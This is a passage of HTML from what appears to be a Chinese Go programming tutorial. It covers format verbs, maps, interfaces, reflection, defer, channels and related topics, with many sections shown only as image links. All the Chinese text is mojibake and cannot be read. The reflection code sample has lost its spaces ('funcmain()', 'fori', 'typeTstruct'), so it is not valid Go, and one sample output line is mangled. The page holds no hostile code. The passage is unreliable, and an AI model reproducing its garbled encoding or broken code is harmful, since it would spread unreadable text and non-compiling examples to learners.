ä»¥äº§ç”Ÿæ›´ç´§å‡‘çš„ï¼ˆæ— æœ«å°¾çš„ 0ï¼‰è¾“å‡º</p><h4 id="å­—ç¬¦ä¸²ä¸å­—èŠ‚åˆ‡ç‰‡"><a href="#å­—ç¬¦ä¸²ä¸å­—èŠ‚åˆ‡ç‰‡" class="headerlink" title="å­—ç¬¦ä¸²ä¸å­—èŠ‚åˆ‡ç‰‡"></a>å­—ç¬¦ä¸²ä¸å­—èŠ‚åˆ‡ç‰‡</h4><p>%s å­—ç¬¦ä¸²æˆ–åˆ‡ç‰‡çš„æ— è§£è¯‘å­—èŠ‚<br>%q åŒå¼•å·å›´ç»•çš„å­—ç¬¦ä¸²ï¼Œç”± Go è¯­æ³•å®‰å…¨åœ°è½¬ä¹‰<br>%x åå…­è¿›åˆ¶ï¼Œå°å†™å­—æ¯ï¼Œæ¯å­—èŠ‚ä¸¤ä¸ªå­—ç¬¦<br>%X åå…­è¿›åˆ¶ï¼Œå¤§å†™å­—æ¯ï¼Œæ¯å­—èŠ‚ä¸¤ä¸ªå­—ç¬¦</p><h4 id="æŒ‡é’ˆ"><a href="#æŒ‡é’ˆ" class="headerlink" title="æŒ‡é’ˆ"></a>æŒ‡é’ˆ</h4><p>%p åå…­è¿›åˆ¶è¡¨ç¤ºï¼Œå‰ç¼€ 0x</p><h2 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h2><p>mapçš„valueå¯ä»¥æ˜¯ä¸€ä¸ªå‡½æ•°</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">myMap := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>, <span class="number">10</span>)</span><br><span class="line">myMap[<span class="string">&quot;a&quot;</span>] = <span class="string">&quot;b&quot;</span></span><br><span class="line">myFuncMap := <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="function"><span class="keyword">func</span><span class="params">()</span> <span class="title">int</span></span>&#123;</span><br><span class="line"><span class="string">&quot;funcA&quot;</span>: <span class="function"><span class="keyword">func</span><span class="params">()</span> <span class="title">int</span></span> &#123; <span class="keyword">return</span> <span class="number">1</span> &#125;,</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(myFuncMap)</span><br><span class="line">f := myFuncMap[<span class="string">&quot;funcA&quot;</span>]</span><br><span class="line">fmt.Println(f())</span><br><span class="line">value, exists := myMap[<span class="string">&quot;a&quot;</span>]</span><br><span class="line"><span class="keyword">if</span> exists &#123;</span><br><span class="line"><span class="built_in">println</span>(value)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> k, v := <span class="keyword">range</span> myMap &#123;</span><br><span class="line"><span class="built_in">println</span>(k, v)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ç»“æ„ä½“å’Œæ¥å£"><a href="#ç»“æ„ä½“å’Œæ¥å£" class="headerlink" title="ç»“æ„ä½“å’Œæ¥å£"></a>ç»“æ„ä½“å’Œæ¥å£</h2><p>ç»“æ„ä½“é‡Œåªèƒ½æœ‰å±æ€§<br>æ¥å£é‡Œåªèƒ½æœ‰æ–¹æ³•<br>newä¸€ä¸ªç»“æ„ä½“è·å¾—çš„æ˜¯ä¸€ä¸ªæŒ‡é’ˆå˜é‡</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> IF <span class="keyword">interface</span> &#123;</span><br><span class="line">getName() <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Human <span class="keyword">struct</span> &#123;</span><br><span class="line">firstName, lastName <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">h := <span class="built_in">new</span>(Human)</span><br></pre></td></tr></table></figure><h3 id="ç»“æ„ä½“å’Œæ ‡ç­¾"><a href="#ç»“æ„ä½“å’Œæ ‡ç­¾" class="headerlink" title="ç»“æ„ä½“å’Œæ ‡ç­¾"></a>ç»“æ„ä½“å’Œæ ‡ç­¾</h3><p>k8sä¸­æ ‡ç­¾å¾ˆå¸¸è§<br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/34.png"></p><h3 id="ç±»å‹é‡å‘½å"><a href="#ç±»å‹é‡å‘½å" class="headerlink" title="ç±»å‹é‡å‘½å"></a>ç±»å‹é‡å‘½å</h3><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/35.png"></p><h2 id="Mainå‡½æ•°"><a href="#Mainå‡½æ•°" class="headerlink" title="Mainå‡½æ•°"></a>Mainå‡½æ•°</h2><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/36.png"></p><h2 id="å‚æ•°è§£æ"><a href="#å‚æ•°è§£æ" class="headerlink" title="å‚æ•°è§£æ"></a>å‚æ•°è§£æ</h2><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/37.png"></p><h2 id="Initå‡½æ•°"><a href="#Initå‡½æ•°" class="headerlink" title="Initå‡½æ•°"></a>Initå‡½æ•°</h2><p>åªä¼šè¿è¡Œä¸€æ¬¡<br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/38.png"><br>æ—©æœŸkubernetesä¸­å› ä¸ºé‡å¤è°ƒç”¨ä¾èµ–ä¼šå‡ºç°é‡å¤flagçš„é—®é¢˜<br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/39.png"></p><h2 id="è¿”å›å€¼"><a href="#è¿”å›å€¼" class="headerlink" title="è¿”å›å€¼"></a>è¿”å›å€¼</h2><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/40.png"></p><h2 id="error"><a href="#error" class="headerlink" title="error"></a>error</h2><p>ä»¥ä¸‹ä¸¤ç§å†™æ³•æ˜¯ç­‰ä»·çš„<br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/41.png"><br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/42.png"></p><h2 id="ä¼ é€’å˜é•¿å‚æ•°"><a href="#ä¼ é€’å˜é•¿å‚æ•°" class="headerlink" title="ä¼ é€’å˜é•¿å‚æ•°"></a>ä¼ é€’å˜é•¿å‚æ•°</h2><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/43.png"></p><h2 id="å†…ç½®å‡½æ•°"><a href="#å†…ç½®å‡½æ•°" class="headerlink" title="å†…ç½®å‡½æ•°"></a>å†…ç½®å‡½æ•°</h2><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/44.png"></p><h2 id="å›è°ƒå‡½æ•°-Callback"><a href="#å›è°ƒå‡½æ•°-Callback" class="headerlink" title="å›è°ƒå‡½æ•°(Callback)"></a>å›è°ƒå‡½æ•°(Callback)</h2><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/45.png"></p><h2 id="é—­åŒ…-åŒ¿åå‡½æ•°"><a href="#é—­åŒ…-åŒ¿åå‡½æ•°" class="headerlink" title="é—­åŒ…(åŒ¿åå‡½æ•°)"></a>é—­åŒ…(åŒ¿åå‡½æ•°)</h2><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/46.png"></p><h2 id="æ–¹æ³•-æˆå‘˜å‡½æ•°"><a href="#æ–¹æ³•-æˆå‘˜å‡½æ•°" class="headerlink" title="æ–¹æ³•(æˆå‘˜å‡½æ•°)"></a>æ–¹æ³•(æˆå‘˜å‡½æ•°)</h2><p>æ™®é€šå‡½æ•°ä½¿ç”¨æ—¶éœ€è¦åŒ…å+å‡½æ•°åæ¥è°ƒç”¨<br>æ–¹æ³•çš„è¯éœ€è¦æ¥å—è€…å+æ–¹æ³•åæ¥è°ƒç”¨<br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/47.png"></p><h2 id="ä¼ å€¼è¿˜æ˜¯ä¼ æŒ‡é’ˆ"><a href="#ä¼ å€¼è¿˜æ˜¯ä¼ æŒ‡é’ˆ" class="headerlink" title="ä¼ å€¼è¿˜æ˜¯ä¼ æŒ‡é’ˆ"></a>ä¼ å€¼è¿˜æ˜¯ä¼ æŒ‡é’ˆ</h2><p>æ¯ä¸ªå‚æ•°éƒ½ç›¸å½“äºæ˜¯å¤åˆ¶äº†ä¸€ä»½å†ä¼ è¿›å»<br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/48.png"></p><h2 id="æ¥å£"><a href="#æ¥å£" class="headerlink" title="æ¥å£"></a>æ¥å£</h2><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/49.png"></p><h3 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> IF <span class="keyword">interface</span> &#123;</span><br><span class="line">    getName() <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Human <span class="keyword">struct</span> &#123;</span><br><span class="line">    firstName, lastName <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Plane <span class="keyword">struct</span> &#123;</span><br><span class="line">    vendor <span class="keyword">string</span></span><br><span class="line">    model  <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *Human)</span> <span class="title">getName</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> h.firstName + <span class="string">&quot;,&quot;</span> + h.lastName</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ä¸åŠ *ä¹Ÿæ˜¯å¯ä»¥è¿è¡Œçš„</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p Plane)</span> <span class="title">getName</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;vendor: %s, model: %s&quot;</span>, p.vendor, p.model)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Car <span class="keyword">struct</span> &#123;</span><br><span class="line">    factory, model <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Car)</span> <span class="title">getName</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> c.factory + <span class="string">&quot;-&quot;</span> + c.model</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    interfaces := []IF&#123;&#125;</span><br><span class="line">    h := <span class="built_in">new</span>(Human)</span><br><span class="line">    h.firstName = <span class="string">&quot;first&quot;</span></span><br><span class="line">    h.lastName = <span class="string">&quot;last&quot;</span></span><br><span class="line">    interfaces = <span class="built_in">append</span>(interfaces, h)</span><br><span class="line">    c := <span class="built_in">new</span>(Car)</span><br><span class="line">    c.factory = <span class="string">&quot;benz&quot;</span></span><br><span class="line">    c.model = <span class="string">&quot;s&quot;</span></span><br><span class="line">    interfaces = <span class="built_in">append</span>(interfaces, c)</span><br><span class="line">    <span class="keyword">for</span> _, f := <span class="keyword">range</span> interfaces &#123;</span><br><span class="line">        fmt.Println(f.getName())</span><br><span class="line">    &#125;</span><br><span class="line">    p := Plane&#123;&#125;</span><br><span class="line">    p.vendor = <span class="string">&quot;testVendor&quot;</span></span><br><span class="line">    p.model = <span class="string">&quot;testModel&quot;</span></span><br><span class="line">    fmt.Println(p.getName())</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h3><ul><li>Interface æ˜¯å¯èƒ½ä¸ºnilçš„ï¼Œæ‰€ä»¥é’ˆå¯¹ interface çš„ä½¿ç”¨ä¸€å®šè¦ é¢„å…ˆåˆ¤ç©ºï¼Œå¦åˆ™ä¼šå¼•èµ·ç¨‹åº crash(nil panic) </li><li>Structåˆå§‹åŒ–æ„å‘³ç€ç©ºé—´åˆ†é…ï¼Œå¯¹ struct çš„å¼•ç”¨ä¸ä¼šå‡ºç°ç©ºæŒ‡é’ˆ<h2 id="åå°„æœºåˆ¶"><a href="#åå°„æœºåˆ¶" class="headerlink" title="åå°„æœºåˆ¶"></a>åå°„æœºåˆ¶</h2><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/50.png"><h3 id="åŸºäº-struct-çš„åå°„"><a href="#åŸºäº-struct-çš„åå°„" class="headerlink" title="åŸºäº struct çš„åå°„"></a>åŸºäº struct çš„åå°„</h3><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/51.png"></li></ul><h3 id="å®ä¾‹-1"><a href="#å®ä¾‹-1" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;reflect&quot;</span></span><br><span class="line">)</span><br><span class="line">funcmain() &#123;</span><br><span class="line"><span class="comment">// basic type</span></span><br><span class="line">myMap := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>, <span class="number">10</span>)</span><br><span class="line"> myMap[<span class="string">&quot;a&quot;</span>] = <span class="string">&quot;b&quot;</span></span><br><span class="line">t := reflect.TypeOf(myMap)</span><br><span class="line"> fmt.Println(<span class="string">&quot;type:&quot;</span>, t)</span><br><span class="line">v := reflect.ValueOf(myMap)</span><br><span class="line"> fmt.Println(<span class="string">&quot;value:&quot;</span>, v)</span><br><span class="line"><span class="comment">// struct</span></span><br><span class="line">myStruct := T&#123;A: <span class="string">&quot;a&quot;</span>&#125;</span><br><span class="line">v1 := reflect.ValueOf(myStruct)</span><br><span class="line">fori := <span class="number">0</span>; i &lt; v1.NumField(); i++ &#123;</span><br><span class="line"> fmt.Printf(<span class="string">&quot;Field %d: %v\n&quot;</span>, i, v1.Field(i))</span><br><span class="line"> &#125;</span><br><span class="line">fori := <span class="number">0</span>; i &lt; v1.NumMethod(); i++ &#123;</span><br><span class="line"> fmt.Printf(<span class="string">&quot;Method %d: %v\n&quot;</span>, i, v1.Method(i))</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">// éœ€è¦æ³¨æ„receiveæ˜¯structè¿˜æ˜¯æŒ‡é’ˆ</span></span><br><span class="line">result := v1.Method(<span class="number">0</span>).Call(<span class="literal">nil</span>)</span><br><span class="line"> fmt.Println(<span class="string">&quot;result:&quot;</span>, result)</span><br><span class="line">&#125;</span><br><span class="line">typeTstruct &#123;</span><br><span class="line"> A <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// éœ€è¦æ³¨æ„receiveæ˜¯structè¿˜æ˜¯æŒ‡é’ˆ</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t T)</span> <span class="title">String</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> t.A + <span class="string">&quot;1&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Goè¯­è¨€ä¸­çš„é¢å‘å¯¹è±¡ç¼–ç¨‹"><a href="#Goè¯­è¨€ä¸­çš„é¢å‘å¯¹è±¡ç¼–ç¨‹" class="headerlink" title="Goè¯­è¨€ä¸­çš„é¢å‘å¯¹è±¡ç¼–ç¨‹"></a>Goè¯­è¨€ä¸­çš„é¢å‘å¯¹è±¡ç¼–ç¨‹</h2><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/52.png"></p><h2 id="Jsonç¼–è§£ç "><a href="#Jsonç¼–è§£ç " class="headerlink" title="Jsonç¼–è§£ç "></a>Jsonç¼–è§£ç </h2><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/53.png"><br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/54.png"><br>å…¶ä¸­<img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/55.png">æ˜¯ç±»å‹æ–­è¨€<br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/56.png">åªèƒ½åœ¨switchè¯­å¥ä¸­ä½¿ç”¨</p><h2 id="é”™è¯¯å¤„ç†"><a href="#é”™è¯¯å¤„ç†" class="headerlink" title="é”™è¯¯å¤„ç†"></a>é”™è¯¯å¤„ç†</h2><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/57.png"></p><h2 id="defer"><a href="#defer" class="headerlink" title="defer"></a>defer</h2><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/58.png"><br>deferç›¸å½“äºä¸€ä¸ª æ ˆï¼Œå…¶ä»–è¯­å¥æ‰§è¡Œå®Œäº†å†æ‰§è¡Œdeferæ ˆé‡Œçš„ </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;sync&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> fmt.Println(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="keyword">defer</span> fmt.Println(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"><span class="keyword">defer</span> fmt.Println(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">loopFunc()</span><br><span class="line">time.Sleep(time.Second)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">loopFunc</span><span class="params">()</span></span> &#123;</span><br><span class="line">lock := sync.Mutex&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</span><br><span class="line"><span class="comment">// go func(i int) &#123;</span></span><br><span class="line">lock.Lock()</span><br><span class="line"><span class="keyword">defer</span> lock.Unlock()</span><br><span class="line">fmt.Println(<span class="string">&quot;loopFunc:&quot;</span>, i)</span><br><span class="line"><span class="comment">// &#125;(i)</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//è¾“å‡ºï¼š</span></span><br><span class="line"><span class="comment">//loopFuncloopFunc: 0</span></span><br><span class="line"><span class="comment">//fatal error: all goroutines are asleep - deadlock!</span></span><br></pre></td></tr></table></figure><p>åŠ ä¸Šæ³¨é‡Šé‡Œçš„å°±ä¸ä¼šæ­»é”äº†ï¼ˆä½¿ç”¨äº†é—­åŒ…ï¼‰ï¼Œæ­¤æ—¶deferç›¸å½“äºfinallyï¼Œ<strong>ä¸ç®¡æ‰§è¡Œè¿‡ç¨‹ä¸­å‘ç”Ÿäº†ä»€ä¹ˆé”éƒ½ä¼šè¢«é‡Šæ”¾æ‰</strong>ã€‚</p><h2 id="Panic-å’Œ-recover"><a href="#Panic-å’Œ-recover" class="headerlink" title="Panic å’Œ recover"></a>Panic å’Œ recover</h2><p>æ¨¡æ‹Ÿtry-catchæœºåˆ¶<br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/59.png"></p><h2 id="å¤šçº¿ç¨‹"><a href="#å¤šçº¿ç¨‹" class="headerlink" title="å¤šçº¿ç¨‹"></a>å¤šçº¿ç¨‹</h2><h3 id="å¹¶å‘å’Œå¹¶è¡Œ"><a href="#å¹¶å‘å’Œå¹¶è¡Œ" class="headerlink" title="å¹¶å‘å’Œå¹¶è¡Œ"></a>å¹¶å‘å’Œå¹¶è¡Œ</h3><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/60.png"></p><h3 id="åç¨‹"><a href="#åç¨‹" class="headerlink" title="åç¨‹"></a>åç¨‹</h3><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/61.png"></p><h3 id="Communication-Sequential-Process"><a href="#Communication-Sequential-Process" class="headerlink" title="Communication Sequential Process"></a>Communication Sequential Process<img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/62.png"></h3><h3 id="çº¿ç¨‹å’Œåç¨‹"><a href="#çº¿ç¨‹å’Œåç¨‹" class="headerlink" title="çº¿ç¨‹å’Œåç¨‹"></a>çº¿ç¨‹å’Œåç¨‹</h3><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/63.png"></p><h3 id="åç¨‹ç¤ºä¾‹"><a href="#åç¨‹ç¤ºä¾‹" class="headerlink" title="åç¨‹ç¤ºä¾‹"></a>åç¨‹ç¤ºä¾‹</h3><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/64.png"><br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/65.png"></p><h3 id="channel-å¤šçº¿ç¨‹é€šä¿¡"><a href="#channel-å¤šçº¿ç¨‹é€šä¿¡" class="headerlink" title="channel-å¤šçº¿ç¨‹é€šä¿¡"></a>channel-å¤šçº¿ç¨‹é€šä¿¡</h3><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/66.png"></p><h3 id="é€šé“ç¼“å†²"><a href="#é€šé“ç¼“å†²" class="headerlink" title="é€šé“ç¼“å†²"></a>é€šé“ç¼“å†²</h3><p>golangä¸­å®šä¹‰channalæ˜¯make(chan int,i)<br>åé¢çš„æ•°å­—iå°±æ˜¯channalçš„å®¹é‡, è¿™é‡Œé‡ç‚¹è¯´ä¸€ä¸‹å®¹é‡ä¸º0(é»˜è®¤)å’Œå®¹é‡ä¸º1çš„åŒºåˆ«:<br>å¯ä»¥æŠŠchannalæƒ³è±¡æˆä¸€ä¸ªæ°´ç®¡<br>å®¹é‡ä¸º0æ—¶, è¿™ä¸ªæ°´ç®¡å¿…é¡»å…ˆæ¥å¥½å‡ºå£,å³&lt;-chan, ç„¶åæ‰èƒ½å¾€æ°´ç®¡é‡Œæ³¨æ°´, å³chan&lt;-<br>è€Œå®¹é‡ä¸º1æ—¶, æ°´ç®¡æœ‰äº†ä¸€ä¸ªè“„æ°´æ± , å°±å¯ä»¥åœ¨æ²¡æ¥å‡ºå£æ—¶, å…ˆå¾€æ°´ç®¡é‡Œæ”¾1ä¸ªå•ä½çš„æ°´,ä¹Ÿå°±æ˜¯è¯´å¯ä»¥å…ˆchan&lt;-, å†&lt;-chan<br>å®¹é‡é»˜è®¤æ˜¯0ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼šæ¥æ•°æ®çš„è¯ï¼Œå¦‚æœä¸è¯»å–çš„è¯å°±ä¼šä¸€ç›´å µå¡ã€‚<br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/67.png"></p><h3 id="éå†é€šé“ç¼“å†²åŒº"><a href="#éå†é€šé“ç¼“å†²åŒº" class="headerlink" title="éå†é€šé“ç¼“å†²åŒº"></a>éå†é€šé“ç¼“å†²åŒº</h3><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/68.png"></p><h3 id="å•å‘é€šé“"><a href="#å•å‘é€šé“" class="headerlink" title="å•å‘é€šé“"></a>å•å‘é€šé“</h3><p>å¯ä»¥é¿å…è¯¯æ“ä½œ<br><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/69.png"></p><h3 id="å…³é—­é€šé“"><a href="#å…³é—­é€šé“" class="headerlink" title="å…³é—­é€šé“"></a>å…³é—­é€šé“</h3><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/70.png"></p><h3 id="select"><a href="#select" class="headerlink" title="select"></a>select</h3><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/71.png"></p><h3 id="Timer"><a href="#Timer" class="headerlink" title="Timer"></a>Timer</h3><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/72.png"></p><h3 id="ä¸Šä¸‹æ–‡Context"><a href="#ä¸Šä¸‹æ–‡Context" class="headerlink" title="ä¸Šä¸‹æ–‡Context"></a>ä¸Šä¸‹æ–‡Context</h3><p><img src="https://snowgo.top/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/73.png"></p><h3 id="å¦‚ä½•åœæ­¢ä¸€ä¸ªå­åç¨‹"><a href="#å¦‚ä½•åœæ­¢ä¸€ä¸ªå­åç¨‹" class="headerlink" 